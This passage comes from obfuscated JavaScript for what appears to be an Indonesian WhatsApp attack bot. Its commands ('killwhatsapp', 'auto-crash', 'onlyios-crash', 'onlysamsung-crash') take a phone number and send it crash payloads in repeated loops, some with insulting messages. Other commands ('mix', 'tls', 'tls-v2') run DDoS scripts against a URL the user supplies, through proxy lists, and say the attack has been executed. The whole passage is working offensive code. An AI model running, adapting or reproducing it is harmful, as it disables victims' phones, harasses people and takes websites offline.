          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x107020 = {
            text: "Saluran WhatsApp\n https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H"
          };
          const _0x3cf09d = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x107020, _0x3cf09d);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x2224de = {
            text: "Saluran WhatsApp\n https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H"
          };
          const _0x2c5202 = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x2224de, _0x2c5202);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "killwhatsapp":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x2fef3b = 0; _0x2fef3b < 5; _0x2fef3b++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x141992 = {
            image: _0x3a5321,
            caption: "KILL WHATSAPP BY RXHL"
          };
          const _0x1bd002 = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x141992, _0x1bd002);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x140767 = {
            image: _0x3a5321,
            caption: "KILL WHATSAPP BY RXHL"
          };
          const _0x27e2b9 = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x140767, _0x27e2b9);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x319053 = {
            image: _0x3a5321,
            caption: "KILL WHATSAPP BY RXHL"
          };
          const _0x4a8d33 = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x319053, _0x4a8d33);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "auto-crash":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x9ce1d6 = 0; _0x9ce1d6 < 5; _0x9ce1d6++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0xdc0403 = {
            text: "*Bang Balikin Duit Gua😭😭*"
          };
          const _0x2ecea6 = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0xdc0403, _0x2ecea6);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x39cf0e = {
            text: "*Bang Balikin Duit Gua😭😭*"
          };
          const _0x533d03 = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x39cf0e, _0x533d03);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x3f03ad = {
            text: "*Bang Balikin Duit Gua😭😭*"
          };
          const _0x13410e = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x3f03ad, _0x13410e);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "new-bunga":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x301e0d = 0; _0x301e0d < 5; _0x301e0d++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x3fc267 = {
            text: "*Flower 🌷*"
          };
          const _0x57af1f = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x3fc267, _0x57af1f);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x1ec432 = {
            text: "*Flower 🌷*"
          };
          const _0x860978 = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x1ec432, _0x860978);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x1fcb05 = {
            text: "*Flower 🌷*"
          };
          const _0x42caed = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x1fcb05, _0x42caed);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "kill-ripper":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x174939 = 0; _0x174939 < 5; _0x174939++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x2100fc = {
            text: "*Mampus Lu Ripper Kontol*"
          };
          const _0x374935 = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x2100fc, _0x374935);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x5dbe31 = {
            text: "*Mampus Lu Ripper Kontol*"
          };
          const _0x1dd147 = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x5dbe31, _0x1dd147);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x42c3c7 = {
            text: "*Mampus Lu Ripper Kontol*"
          };
          const _0x11af79 = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x42c3c7, _0x11af79);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "external-crash1":
      case "external-crash2":
      case "external-crash3":
      case "internal-crash1":
      case "internal-crash2":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x487a75 = 0; _0x487a75 < 5; _0x487a75++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x578368 = {
            text: "Anjay " + _0x63bd7f + " ✅"
          };
          const _0x36ff87 = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x578368, _0x36ff87);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x5043c5 = {
            text: "Anjay " + _0x63bd7f + " ✅"
          };
          const _0x13136e = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x5043c5, _0x13136e);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x68a719 = {
            text: "Anjay " + _0x63bd7f + " ✅"
          };
          const _0x584719 = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x68a719, _0x584719);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "onlyios-crash":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x26e8e3 = 0; _0x26e8e3 < 5; _0x26e8e3++) {
          await _0x5bbaac(Pe);
          await _0x5bbaac(Pe);
          await _0x5bbaac(Pe);
          await _0x5bbaac(Pe);
          await _0x5bbaac(Pe);
          await _0x5bbaac(Pe);
          await _0x5bbaac(Pe);
          await _0x5bbaac(Pe);
          await _0x5bbaac(Pe);
          await _0x5bbaac(Pe);
          await _0x5bbaac(Pe);
          await _0x5bbaac(Pe);
          await _0x5bbaac(Pe);
          await _0x5bbaac(Pe);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "onlysamsung-crash":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x51eda2 = 0; _0x51eda2 < 6; _0x51eda2++) {
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "enc":
        if (!_0x4cefc4) {
          return _0x18a4d7.reply(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example " + (_0x11f9b4 + _0x63bd7f) + " const time = require('money')");
        }
        let _0x3ce9ad = await _0x3c3c20(q);
        _0x41d276('' + _0x3ce9ad.result);
        break;
      case "clear":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        const _0x404a0b = {
          text: "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
        };
        _0x2f9d2e.sendMessage(Pe, _0x404a0b);
        _0x41d276("done");
        break;
      case "mix":
        {
          if (!_0x4d4b5c) {
            return _0x41d276(global.nocreator);
          }
          let _0x11dfec = q.split(" ")[0];
          let _0x3aac08 = q.split(" ")[1];
          let _0x4ea3da = q.split(" ")[2];
          let _0x3ebdcc = q.split(" ")[3];
          if (_0xe61016.length === 4 && _0x11dfec && _0x3aac08 && _0x4ea3da && _0x3ebdcc) {
            _0x41d276("Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: " + _0x11dfec + " 👤 Proses ini diperkirakan akan berlangsung selama " + _0x3aac08 + " detik. Terima kasih atas kesabaran Anda.");
            _0x5a36ba("node ./lib/ddos/mix.js " + _0x11dfec + " " + _0x3aac08 + " " + _0x4ea3da + " " + _0x3ebdcc, (_0x3c5e0e, _0x508b73) => {
              if (_0x3c5e0e) {
                return console.log(_0x3c5e0e.toString());
              }
              if (_0x508b73) {
                return console.log(util.format(_0x508b73));
              }
            });
          } else {
            _0x41d276("Format pesan tidak benar. Gunakan format: ." + _0x63bd7f + " [url] [time] [thread] [rate]");
          }
        }
        break;
      case "tls":
        {
          if (!_0x4d4b5c) {
            return _0x41d276(global.nocreator);
          }
          let _0x9bea83 = q.split(" ")[0];
          let _0x5db480 = q.split(" ")[1];
          let _0x8a646f = q.split(" ")[2];
          let _0x1bc6ab = q.split(" ")[3];
          if (_0xe61016.length === 4 && _0x9bea83 && _0x5db480 && _0x8a646f && _0x1bc6ab) {
            _0x41d276("Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: " + _0x9bea83 + " 👤 Proses ini diperkirakan akan berlangsung selama " + _0x5db480 + " detik. Terima kasih atas kesabaran Anda.");
            _0x5a36ba("node ./lib/ddos/tls-arz.js " + _0x9bea83 + " " + _0x5db480 + " " + _0x1bc6ab + " " + _0x8a646f + " proxy.txt", (_0x5ccb57, _0x5842bc) => {
              if (_0x5ccb57) {
                return console.log(_0x5ccb57.toString());
              }
              if (_0x5842bc) {
                return console.log(util.format(_0x5842bc));
              }
            });
          } else {
            _0x41d276("Format pesan tidak benar. Gunakan format: ." + _0x63bd7f + " [url] [time] [thread] [rate]");
          }
        }
        break;
      case "tls-v2":
        {
          if (!_0x4d4b5c) {
            return _0x41d276(global.nocreator);
          }
          let _0x22db04 = q.split(" ")[0];
          let _0x400c22 = q.split(" ")[1];
          let _0x9d9523 = q.split(" ")[2];
          let _0x61bdd7 = q.split(" ")[3];
          if (_0xe61016.length === 4 && _0x22db04 && _0x400c22 && _0x9d9523 && _0x61bdd7) {
            _0x41d276("Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: " + _0x22db04 + " 👤 Proses ini diperkirakan akan berlangsung selama " + _0x400c22 + " detik. Terima kasih atas kesabaran Anda.");
            _0x5a36ba("node ./lib/ddos/tls.js " + _0x22db04 + " " + _0x400c22 + " " + _0x61bdd7 + " " + _0x9d9523 + " proxy.txt", (_0x1dea18, _0x47d50d) => {
              if (_0x1dea18) {
                return console.log(_0x1dea18.toString());
              }
              if (_0x47d50d) {
                return console.log(util.format(_0x47d50d));
              }
            });
          } else {
            _0x41d276("Format pesan tidak benar. Gunakan format: ." + _0x63bd7f + " [url] [time] [thread] [rate]");
          }
        }
        break;
      case "kilua":
        {
          if (!_0x4d4b5c) {
            return _0x41d276(global.nocreator);
          }
          let _0x5e1572 = q.split(" ")[0];
          let _0x1302a7 = q.split(" ")[1];
          let _0x3c4dcf = q.split(" ")[2];
          let _0xdae13 = q.split(" ")[3];
          if (_0xe61016.length === 4 && _0x5e1572 && _0x1302a7 && _0x3c4dcf && _0xdae13) {
